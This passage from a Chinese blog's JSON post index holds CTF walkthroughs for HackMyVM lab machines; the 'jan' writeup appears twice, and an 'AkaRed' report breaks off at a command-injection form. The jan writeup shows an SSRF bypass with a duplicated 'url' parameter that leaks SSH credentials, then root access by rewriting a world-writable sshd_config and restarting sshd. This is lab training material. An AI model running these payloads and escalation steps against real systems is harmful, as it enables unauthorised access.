env_keep+='SUDO_EDITOR EDITOR VISUAL'\n\nUser ssh may run the following commands on jan:\n    (root) NOPASSWD: /sbin/service sshd restart\n```\n\n\u5927\u6982\u7387\u662f\u6539ssh\u7684\u914d\u7f6e\u6587\u4ef6\u4e86\uff0c\u770b\u770b\u6709\u6ca1\u6709\u6743\u9650\n\n```\njan:~$ ls -al /etc/ssh/sshd_config\n-rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config\n```\n\n\u6709\u6743\u9650\uff0c\u90a3\u6211\u4eec\u751f\u6210\u4e00\u4e2a\u5bc6\u94a5\uff0c\u901a\u8fc7\u5bc6\u94a5\u767b\u5f55root\u5c31\u597d\u4e86\n\n```\njan:~$ ssh-keygen -t rsa \nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/ssh/.ssh/id_rsa): \nCreated directory '/home/ssh/.ssh'.\nEnter passphrase for '/home/ssh/.ssh/id_rsa' (empty for no passphrase): \nEnter same passphrase again: \nYour identification has been saved in /home/ssh/.ssh/id_rsa\nYour public key has been saved in /home/ssh/.ssh/id_rsa.pub\nThe key fingerprint is:\nSHA256:FNapkUoVgyB2BhdqurZup7sNDvaCmQhWvV/OC5czxA8 ssh@jan\nThe key's randomart image is:\n+---[RSA 3072]----+\n|  +.*o o*+ .     |\n| . *  o.ooo      |\n|  o .. ..o       |\n| o . ...o        |\n|. .   . SE       |\n|.o   .  ..+      |\n|B*    ..+= .     |\n|Xo=.   .ooo      |\n|oB*o     ..      |\n+----[SHA256]-----+\n\njan:~$ cp .ssh/id_rsa.pub /tmp/authorized_keys\njan:~$ chmod 600 /tmp/authorized_keys \njan:~$ ls -la /tmp/\ntotal 8\ndrwxrwxrwt    4 root     root           100 Feb  3 04:56 .\ndrwxr-xr-x   21 root     root          4096 Jan 28 09:01 ..\ndrwxrwxrwt    2 root     root            40 Feb  3 04:39 .ICE-unix\ndrwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix\n-rw-------    1 ssh      ssh            561 Feb  3 04:56 authorized_keys\n\njan:~$ vi /etc/ssh/sshd_config\n```\n\n![image-20250331191252272](https://7r1umphk.github.io/image/20250331191252331.png)\n\n```\njan:~$ sudo /sbin/service sshd restart\n * Stopping sshd ...                                                                                                             [ ok ]\n * Starting sshd ...                                                                                                             [ ok ]\njan:~$ ssh root@127.0.0.1\n/etc/ssh/ssh_config: line 23: Bad configuration option: banner\n/etc/ssh/ssh_config: terminating, 1 bad configuration options\n```\n\nbanner\u5e94\u8be5\u4e5f\u80fd\u63d0\u6743\uff0c\u4f46\u662f\u6211\u4e0d\u7ba1\u5b83\u4e86\n\n```\njan:~$ vi /etc/ssh/ssh_config\n```\n\n![image-20250331191302680](https://7r1umphk.github.io/image/20250331191302731.png)\n\n```\njan:~$ ssh root@127.0.0.1\nThe authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.\nED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.\nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee <https://wiki.alpinelinux.org/>.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\njan:~# id\nuid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n```\n\n# 5.\u7b2c\u4e8c\u79cd\u65b9\u6cd5\n\n![image-20250331191312627](https://7r1umphk.github.io/image/20250331191312690.png)\n\n\ud83d\udd17https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83\n\n\u8fd9\u4e2a\u65b9\u6cd5\u6211\u6ca1\u8bd5\u8fc7\uff0c\u81ea\u5df1\u5c1d\u8bd5\u4e00\u4e0b\u5427\n\n<!-- ##{'timestamp':1738580133}## -->sentence", "top": 0, "createdAt": 1751016435, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P5": {"htmlDir": "docs/post/hmv_jan.html", "labels": ["HackMyVM"], "postTitle": "hmv_jan", "postUrl": "post/hmv_jan.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/5", "commentNum": 0, "wordCount": 13580, "description": "# 0.\u7b80\u4ecb\n\n\u9776\u673a\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=jan\n \u96be\u5ea6\uff1a\u7eff\u8272\n \u76ee\u6807 IP\uff1a192.168.205.136\n \u672c\u673a IP\uff1a192.168.205.128\n\n# 1.\u626b\u63cf\n\nnmap\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A 192.168.205.136\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:40 CST\nNmap scan report for 192.168.205.136\nHost is up (0.00023s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)\n| ssh-hostkey: \n|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)\n|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)\n8080/tcp open  http    Golang net/http server\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n| fingerprint-strings: \n|   FourOhFourRequest, GetRequest, HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Date: Mon, 03 Feb 2025 04:40:49 GMT\n|     Content-Length: 45\n|     Content-Type: text/plain; charset=utf-8\n|     Welcome to our Public Server. Maybe Internal.\n|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   OfficeScan: \n|     HTTP/1.1 400 Bad Request: missing required Host header\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|_    Request: missing required Host header\n|_http-open-proxy: Proxy might be redirecting requests\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.95%I=7%D=2/3%Time=67A048E1%P=x86_64-pc-linux-gnu%r(Get\nSF:Request,A2,'HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x2003\\x20Feb\\x20202\nSF:5\\x2004:40:49\\x20GMT\\r\\nContent-Length:\\x2045\\r\\nContent-Type:\\x20text/\nSF:plain;\\x20charset=utf-8\\r\\n\\r\\nWelcome\\x20to\\x20our\\x20Public\\x20Server\nSF:\\.\\x20Maybe\\x20Internal\\.')%r(HTTPOptions,A2,'HTTP/1\\.0\\x20200\\x20OK\\r\\\nSF:nDate:\\x20Mon,\\x2003\\x20Feb\\x202025\\x2004:40:49\\x20GMT\\r\\nContent-Lengt\nSF:h:\\x2045\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\nWelcom\nSF:e\\x20to\\x20our\\x20Public\\x20Server\\.\\x20Maybe\\x20Internal\\.')%r(RTSPReq\nSF:uest,67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/pl\nSF:ain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Requ\nSF:est')%r(FourOhFourRequest,A2,'HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x\nSF:2003\\x20Feb\\x202025\\x2004:40:49\\x20GMT\\r\\nContent-Length:\\x2045\\r\\nCont\nSF:ent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\nWelcome\\x20to\\x20our\\x\nSF:20Public\\x20Server\\.\\x20Maybe\\x20Internal\\.')%r(Socks5,67,'HTTP/1\\.1\\x2\nSF:0400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\nSF:\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request')%r(GenericLines,\nSF:67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\\nSF:x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request')\nSF:%r(Help,67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text\nSF:/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20R\nSF:equest')%r(SSLSessionReq,67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCont\nSF:ent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\nSF:\\n400\\x20Bad\\x20Request')%r(LPDString,67,'HTTP/1\\.1\\x20400\\x20Bad\\x20Re\nSF:quest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x\nSF:20close\\r\\n\\r\\n400\\x20Bad\\x20Request')%r(SIPOptions,67,'HTTP/1\\.1\\x2040\nSF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\\nSF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request')%r(OfficeScan,A3,'H\nSF:TTP/1\\.1\\x20400\\x20Bad\\x20Request:\\x20missing\\x20required\\x20Host\\x20he\nSF:ader\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x2\nSF:0close\\r\\n\\r\\n400\\x20Bad\\x20Request:\\x20missing\\x20required\\x20Host\\x20\nSF:header');\nMAC Address: 08:00:27:3A:49:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.23 ms 192.168.205.136\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 28.01 seconds\n                                                                             \n```\n\n8080\u7aef\u53e3sT\u548csS\u53c2\u6570\u63a2\u6d4b\u4e0d\u51fa\u6765\uff0c\u6240\u4ee5\u5efa\u8bae\u4e0d\u4f7f\u7528\n\n# 2.\u8e29\u70b9\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/                            \nWelcome to our Public Server. Maybe Internal.                                                                                                                                    \n```\n\n\u8fdb\u884c\u76ee\u5f55\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ feroxbuster -u http://192.168.205.136:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt\n                                                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben 'epi' Risher \ud83e\udd13                 ver: 2.11.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://192.168.205.136:8080\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.11.0\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83d\udcb2  Extensions            \u2502 [php, html, md, txt]\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n200      GET        1l        7w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   \n400      GET        1l        3w       24c http://192.168.205.136:8080/redirect\n200      GET        2l        2w       16c http://192.168.205.136:8080/robots.txt\n[####################] - 54s   598005/598005  0s      found:2       errors:0    \n[####################] - 54s   598005/598005  11090/s http://192.168.205.136:8080/           \n```\n\n\u63a2\u7d22\u4e00\u6ce2\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/redirect\nParameter 'url' needed.\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/robots.txt\n/redirect\n/credz                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/credz   \nOnly accessible internally.                                                                                                                                    \n```\n\n\u76ee\u524d\u6765\u770b\u51fa\u9898\u601d\u8def\u662f\u901a\u8fc7/redirect\u8bbf\u95ee/credz\uff0c\u8fdb\u884c\u5c1d\u8bd5\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/credz   \nOnly accessible internally.                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt\nOnly accessible internally.                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl -I http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt\nHTTP/1.1 200 OK\nDate: Mon, 03 Feb 2025 04:47:07 GMT\nContent-Length: 27\nContent-Type: text/plain; charset=utf-8\n```\n\n\u8fd9\u91cc\u6211\u6d4b\u8bd5\u4e86\u633a\u591a\u7ed5\u8fc7\u68c0\u6d4b\u7684\u65b9\u6cd5\uff0c\u6211\u5c31\u4e0d\u5199\u51fa\u6765\u4e86\uff0c\u6b63\u786e\u65b9\u6cd5\u662f\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=192.168.205.136:8080/credz'\n                                         \n```\n\n\u8fd4\u56de\u7a7a\u767d\uff0c\u7a7a\u767d\u5c31\u662f\u6709\u673a\u53ef\u5bfb\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=127.0.0.1:8080/credz'\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=/credz'            \nssh/EazyLOL                                                                                                                                     \n```\n\n\u767b\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh ssh@192.168.205.136\nThe authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.\nED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:3: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.\nssh@192.168.205.136's password: \nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee <https://wiki.alpinelinux.org/>.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\njan:~$ id\nuid=1000(ssh) gid=1000(ssh) groups=1000(ssh)\n```\n\n# 4.\u63d0\u6743\n\n```\njan:~$ ls -al\ntotal 12\ndrwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .\ndrwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..\nlrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -> /dev/null\n-rw-------    1 ssh      ssh             22 Jan 28 09:20 user.txt\njan:~$ sudo -l\nMatching Defaults entries for ssh on jan:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults for ssh:\n    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'\n\nUser ssh may run the following commands on jan:\n    (root) NOPASSWD: /sbin/service sshd restart\n```\n\n\u5927\u6982\u7387\u662f\u6539ssh\u7684\u914d\u7f6e\u6587\u4ef6\u4e86\uff0c\u770b\u770b\u6709\u6ca1\u6709\u6743\u9650\n\n```\njan:~$ ls -al /etc/ssh/sshd_config\n-rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config\n```\n\n\u6709\u6743\u9650\uff0c\u90a3\u6211\u4eec\u751f\u6210\u4e00\u4e2a\u5bc6\u94a5\uff0c\u901a\u8fc7\u5bc6\u94a5\u767b\u5f55root\u5c31\u597d\u4e86\n\n```\njan:~$ ssh-keygen -t rsa \nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/ssh/.ssh/id_rsa): \nCreated directory '/home/ssh/.ssh'.\nEnter passphrase for '/home/ssh/.ssh/id_rsa' (empty for no passphrase): \nEnter same passphrase again: \nYour identification has been saved in /home/ssh/.ssh/id_rsa\nYour public key has been saved in /home/ssh/.ssh/id_rsa.pub\nThe key fingerprint is:\nSHA256:FNapkUoVgyB2BhdqurZup7sNDvaCmQhWvV/OC5czxA8 ssh@jan\nThe key's randomart image is:\n+---[RSA 3072]----+\n|  +.*o o*+ .     |\n| . *  o.ooo      |\n|  o .. ..o       |\n| o . ...o        |\n|. .   . SE       |\n|.o   .  ..+      |\n|B*    ..+= .     |\n|Xo=.   .ooo      |\n|oB*o     ..      |\n+----[SHA256]-----+\n\njan:~$ cp .ssh/id_rsa.pub /tmp/authorized_keys\njan:~$ chmod 600 /tmp/authorized_keys \njan:~$ ls -la /tmp/\ntotal 8\ndrwxrwxrwt    4 root     root           100 Feb  3 04:56 .\ndrwxr-xr-x   21 root     root          4096 Jan 28 09:01 ..\ndrwxrwxrwt    2 root     root            40 Feb  3 04:39 .ICE-unix\ndrwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix\n-rw-------    1 ssh      ssh            561 Feb  3 04:56 authorized_keys\n\njan:~$ vi /etc/ssh/sshd_config\n```\n\n![image-20250331191252272](https://7r1umphk.github.io/image/20250331191252331.png)\n\n```\njan:~$ sudo /sbin/service sshd restart\n * Stopping sshd ...                                                                                                             [ ok ]\n * Starting sshd ...                                                                                                             [ ok ]\njan:~$ ssh root@127.0.0.1\n/etc/ssh/ssh_config: line 23: Bad configuration option: banner\n/etc/ssh/ssh_config: terminating, 1 bad configuration options\n```\n\nbanner\u5e94\u8be5\u4e5f\u80fd\u63d0\u6743\uff0c\u4f46\u662f\u6211\u4e0d\u7ba1\u5b83\u4e86\n\n```\njan:~$ vi /etc/ssh/ssh_config\n```\n\n![image-20250331191302680](https://7r1umphk.github.io/image/20250331191302731.png)\n\n```\njan:~$ ssh root@127.0.0.1\nThe authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.\nED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.\nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee <https://wiki.alpinelinux.org/>.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\njan:~# id\nuid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n```\n\n# 5.\u7b2c\u4e8c\u79cd\u65b9\u6cd5\n\n![image-20250331191312627](https://7r1umphk.github.io/image/20250331191312690.png)\n\n\ud83d\udd17https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83\n\n\u8fd9\u4e2a\u65b9\u6cd5\u6211\u6ca1\u8bd5\u8fc7\uff0c\u81ea\u5df1\u5c1d\u8bd5\u4e00\u4e0b\u5427\n\n<!-- ##{'timestamp':1738580133}## -->sentence", "top": 0, "createdAt": 1751016474, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P9": {"htmlDir": "docs/post/shen-tou-ce-shi-bao-gao- - AkaRed (-ce-shi-ba-ji-).html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u6e17\u900f\u6d4b\u8bd5\u62a5\u544a - AkaRed (\u6d4b\u8bd5\u9776\u673a)", "postUrl": "post/shen-tou-ce-shi-bao-gao-%20-%20AkaRed%20%28-ce-shi-ba-ji-%29.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/9", "commentNum": 0, "wordCount": 10772, "description": "## 1. \u7b80\u4ecb\n\n**\u9776\u673a\u540d\u79f0**: AkaRed (\u672a\u53d1\u5e03\uff0c\u5185\u90e8\u6d4b\u8bd5\u9776\u673a\uff0c\u53ef\u80fd\u540e\u7eed\u53d1\u5e03\u4e8e HackMyVm)\n**\u96be\u5ea6**: \u8d85\u7ea7\u7b80\u5355\n**\u653b\u51fb\u8005 IP:** `192.168.205.128` (Kali Linux)\n**\u76ee\u6807 IP:** `192.168.205.185` (AkaRed)\n\n## 1. \u4fe1\u606f\u6536\u96c6 (Enumeration)\n\n\u6b64\u9636\u6bb5\u65e8\u5728\u53d1\u73b0\u76ee\u6807\u5e76\u4e86\u89e3\u5176\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n### 1.1. \u7f51\u7edc\u53d1\u73b0 (Network Discovery)\n\n\u4f7f\u7528 `arp-scan` \u5728\u672c\u5730\u7f51\u7edc\u4e2d\u63a2\u6d4b\u5b58\u6d3b\u4e3b\u673a\uff0c\u56e0\u4e3a\u5b83\u901a\u8fc7 ARP \u8bf7\u6c42\u8fdb\u884c\u626b\u63cf\uff0c\u901a\u5e38\u6bd4 IP/\u7aef\u53e3\u626b\u63cf\u66f4\u5feb\u4e14\u4e0d\u6613\u88ab\u9632\u706b\u5899\u62e6\u622a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo arp-scan -l # -l \u8868\u793a\u626b\u63cf\u672c\u5730\u7f51\u7edc\n\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n# ... (\u5176\u4ed6\u4e3b\u673a) ...\n192.168.205.185 08:00:27:3b:24:68       PCS Systemtechnik GmbH  # <-- \u53d1\u73b0\u76ee\u6807\n# ... (\u5176\u4ed6\u4e3b\u673a) ...\n\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.036 seconds (125.74 hosts/sec). 4 responded\n```\n\n\u76ee\u6807\u4e3b\u673a IP \u786e\u5b9a\u4e3a `192.168.205.185`\u3002MAC \u5730\u5740 `08:00:27:3b:24:68` \u5bf9\u5e94\u7684\u5382\u5546 `PCS Systemtechnik GmbH` \u901a\u5e38\u4e0e Oracle VirtualBox \u76f8\u5173\u8054\u3002\n\n### 1.2. \u7aef\u53e3\u626b\u63cf (Port Scanning)\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u8bc6\u522b\u5f00\u653e\u7684 TCP \u7aef\u53e3\u53ca\u8fd0\u884c\u7684\u670d\u52a1\u3002\n\n* \u9996\u5148\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf (`-p-`)\uff0c\u786e\u4fdd\u4e0d\u9057\u6f0f\u4efb\u4f55\u53ef\u80fd\u5f00\u653e\u7684\u7aef\u53e3\u3002\n\n  ```bash\n  \u250c\u2500\u2500(kali\u327fkali)-[~/test]\n  \u2514\u2500$ nmap -p- 192.168.205.185    \n  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST\n  Nmap scan report for 192.168.205.185\n  Host is up (0.00016s latency).\n  Not shown: 65533 closed tcp ports (reset)\n  PORT   STATE SERVICE\n  22/tcp open  ssh\n  80/tcp open  http\n  MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n  \n  Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds\n  ```\n\n* \u9488\u5bf9\u5df2\u53d1\u73b0\u7684\u7aef\u53e3\u8fdb\u884c\u66f4\u8be6\u7ec6\u7684\u670d\u52a1\u7248\u672c\u63a2\u6d4b\u3002\n\n  ```bash\n  \u250c\u2500\u2500(kali\u327fkali)-[~/test]\n  \u2514\u2500$ nmap -p22,80 -sV 192.168.205.185\n  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST\n  Nmap scan report for 192.168.205.185\n  Host is up (0.00027s latency).\n  \n  PORT   STATE SERVICE    VERSION\n  22/tcp open  tcpwrapped\n  80/tcp open  http       Apache httpd 2.4.59 ((Debian))\n  MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n  \n  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds\n  ```\n\n  \u626b\u63cf\u7ed3\u679c\u786e\u8ba4\u7aef\u53e3 22 (SSH) \u548c 80 (HTTP) \u5f00\u653e\u3002\n\n### 1.3. Web \u670d\u52a1\u63a2\u6d4b (Web Enumeration)\n\n\u4f7f\u7528 `curl` \u68c0\u67e5 80 \u7aef\u53e3\u7684 HTTP \u670d\u52a1\uff0c\u83b7\u53d6\u7f51\u9875\u5185\u5bb9\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 192.168.205.185\n<!DOCTYPE html>\n<html>\n<head>\n    <title>CyberPing 2077</title>\n    <!-- ... CSS (\u5df2\u7701\u7565) ... -->\n</head>\n<body>\n    <div class='container'>\n        <h1 class='glitch'>\u2b9f CYBERPING 2077 \u2b9f</h1>\n        <form method='post'>\n            <input type='text' name='ip' placeholder='Enter target IP/command' required>\n            <button type='submit'>Execute Command</button>\n        </form>\n    </div>\n</body>\n</html>\n```\n\n\u7f51\u9875\u6807\u9898\u4e3a 'CyberPing 2077'\uff0c\u5305\u542b\u4e00\u4e2a\u8868\u5355\uff0c\u8f93\u5165\u6846 `name='ip'` \u4e14\u63d0\u793a\u4e3a 'Enter target IP/command'\u3002\u8fd9\u6781\u6709\u53ef\u80fd\u662f\u4e00\u4e2a\u5141\u8bb8\u7528\u6237\u8f93\u5165 IP \u5730\u5740\u6267\u884c `ping` \u547d\u4ee4\u7684\u529f\u80fd\uff0c\u5e76\u4e14\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u7684\u98ce\u9669\u3002\n\n![](https://7r1umphk.github.io/image/20250411202259981.png)\n\n## 2. \u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650 (Initial Access - Command 